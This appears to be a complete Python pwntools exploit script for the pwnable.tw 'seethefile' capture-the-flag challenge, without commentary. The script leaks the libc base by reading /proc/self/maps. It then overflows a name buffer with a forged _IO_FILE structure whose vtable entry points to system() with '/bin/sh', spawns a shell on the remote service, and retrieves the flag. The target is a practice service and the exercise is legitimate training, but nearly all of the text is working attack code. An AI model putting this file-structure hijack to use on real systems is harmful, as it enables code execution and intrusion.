from pwn import *

p32 = lambda x: struct.pack("<L",x) #unsigned long
up32 = lambda x: struct.unpack("<L", x)[0] #unpack unsigned long

addr = "chall.pwnable.tw"
port = 10200
binary = "./seethefile"
binary = "/home/seung/seethefile1"

elf = ELF(binary)

libc = ELF("./libc_32.so.6")
system_offset = libc.symbols['system']
stderr_offset = libc.symbols['stderr']

s = remote(addr, port)

def Welcome():
    sleep(0.3)
    print s.recvuntil("#######################################################")
    print s.recvuntil("   This is a simple program to open,read,write a file")
    print s.recvuntil("   You can open what you want to see")
    print s.recvuntil("   Can you read everything ?")
    print s.recvuntil("#######################################################")

def Menu():
    sleep(0.3)
    print s.recvuntil("---------------MENU---------------")
    print s.recvuntil("  1. Open")
    print s.recvuntil("  2. Read")
    print s.recvuntil("  3. Write to screen")
    print s.recvuntil("  4. Close")
    print s.recvuntil("  5. Exit")
    print s.recvuntil("----------------------------------")
    print s.recvuntil("Your choice :")

def Open(_file):
    Menu()
    s.sendline("1")
    sleep(0.3)
    print s.recvuntil("What do you want to see :")
    s.sendline(_file)
    sleep(0.3)
    print s.recvuntil("Open Successful")

def Read():
    Menu()
    s.sendline("2")
    sleep(0.3)
    print s.recvuntil("Read Successful")

def Write():
    Menu()
    s.sendline("3")
    sleep(0.3)
    print s.recvuntil("[heap]")
    print s.recvuntil("-")
    libc = int(s.recv(7)+"0",16)
    return libc

def Exit(name):
    Menu()
    s.sendline("5")
    sleep(0.3)
    print s.recvuntil("Leave your name :")
    s.sendline(name)
    sleep(0.3)
    print s.recvuntil("Thank you")
    print s.recvuntil(",see you next time\n")

flag = 0xfbad2488
name = 0x0804B260
fake_heap = 0x0804B284
null_ptr = 0x0804b28c
_IO_FILE = 0x0804b31c


Welcome()
Open("/proc/self/maps")
Read()
libc = Write()
system_libc = libc + system_offset
one_shot = system_libc - 0x127
print "[+] libc : %x" % libc
print "[+] system_libc : %x" % system_libc
print "[+] one_shot : %x" % one_shot

payload = "A"*32

payload += p32(fake_heap)

#fake_heap
payload += "/bin/sh\x00"
payload += p32(0x00000000)*11
payload += p32(0x00000000)
payload += p32(3)
payload += p32(0x00000000)*3
payload += p32(null_ptr) # -> NULL
payload += p32(0xffffffff)
payload += p32(0xffffffff)
payload += p32(0x00000000)
payload += p32(null_ptr) # -> NULL
payload += p32(0x00000000)*14
payload += p32(_IO_FILE)

#_IO_FILE
payload += p32(0x00000000)*17 # 68/4
payload += p32(system_libc)

Exit(payload)

s.sendline("/home/seethefile/get_flag")
sleep(0.5)
s.recvuntil("Your magic :")
s.sendline("Give me the flag")

s.interactive()
s.close()
